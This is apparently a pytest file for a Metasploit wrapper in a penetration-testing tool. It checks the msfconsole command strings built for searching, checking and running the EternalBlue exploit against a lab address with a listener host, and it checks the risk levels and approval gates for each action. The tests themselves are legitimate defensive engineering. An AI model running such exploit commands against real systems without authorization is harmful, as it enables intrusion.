from saber.models.target import Target, TargetType
from saber.tools.exploitation.metasploit import CONTRACT, MetasploitWrapper


def _target():
    return Target(type=TargetType.IP, value="10.129.42.10")


def _wrapper():
    return MetasploitWrapper(sandbox=None)


def test_search_modules_command():
    cmd = _wrapper().build_command(_target(), action="search_modules", query="eternalblue")
    assert cmd.command == ["msfconsole", "-q", "-x", "search eternalblue; exit -y"]
    assert cmd.action == "search_modules"


def test_show_module_info_command():
    cmd = _wrapper().build_command(
        _target(),
        action="show_module_info",
        module="exploit/windows/smb/ms17_010_eternalblue",
    )
    assert cmd.command == [
        "msfconsole",
        "-q",
        "-x",
        "info exploit/windows/smb/ms17_010_eternalblue; exit -y",
    ]
    assert cmd.action == "show_module_info"


def test_check_module_command_sets_options_and_requires_authorization():
    cmd = _wrapper().build_command(
        _target(),
        action="check_module",
        module="exploit/windows/smb/ms17_010_eternalblue",
        options={"RHOSTS": "10.129.42.10"},
    )
    assert cmd.command == [
        "msfconsole",
        "-q",
        "-x",
        "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.129.42.10; check; exit -y",
    ]
    assert cmd.action == "check_module"
    assert cmd.requires_explicit_authorization is True


def test_run_module_command_sets_multiple_options_in_order():
    cmd = _wrapper().build_command(
        _target(),
        action="run_module",
        module="exploit/windows/smb/ms17_010_eternalblue",
        options={"RHOSTS": "10.129.42.10", "LHOST": "10.10.14.5"},
    )
    assert cmd.command == [
        "msfconsole",
        "-q",
        "-x",
        "use exploit/windows/smb/ms17_010_eternalblue; "
        "set RHOSTS 10.129.42.10; set LHOST 10.10.14.5; run; exit -y",
    ]
    assert cmd.action == "run_module"
    assert cmd.requires_explicit_authorization is True


def test_unsupported_action_raises():
    try:
        _wrapper().build_command(_target(), action="bogus")
    except ValueError as exc:
        assert "Unsupported Metasploit action" in str(exc)
    else:
        raise AssertionError("Expected ValueError for unsupported action")


def test_contract_declares_all_four_dispatch_branches():
    assert {a.action for a in CONTRACT.actions} == {
        "search_modules",
        "show_module_info",
        "check_module",
        "run_module",
    }


def test_contract_risk_and_approval_gates():
    by_action = {a.action: a for a in CONTRACT.actions}
    assert by_action["search_modules"].risk == "low"
    assert by_action["search_modules"].requires_approval is False
    assert by_action["show_module_info"].risk == "low"
    assert by_action["show_module_info"].requires_approval is False
    assert by_action["check_module"].risk == "medium"
    assert by_action["check_module"].requires_approval is True
    assert by_action["run_module"].risk == "high"
    assert by_action["run_module"].requires_approval is True


def test_contract_declares_no_reserved_args():
    reserved = {"target", "session", "action", "metadata"}
    for action in CONTRACT.actions:
        assert not ({spec.name for spec in action.args} & reserved)
        assert not (set(action.example_args) & reserved)


def test_contract_actions_are_buildable_from_their_own_example_args():
    wrapper = _wrapper()
    for action in CONTRACT.actions:
        command = wrapper.build_command(_target(), action=action.action, **action.example_args)
        assert command.command
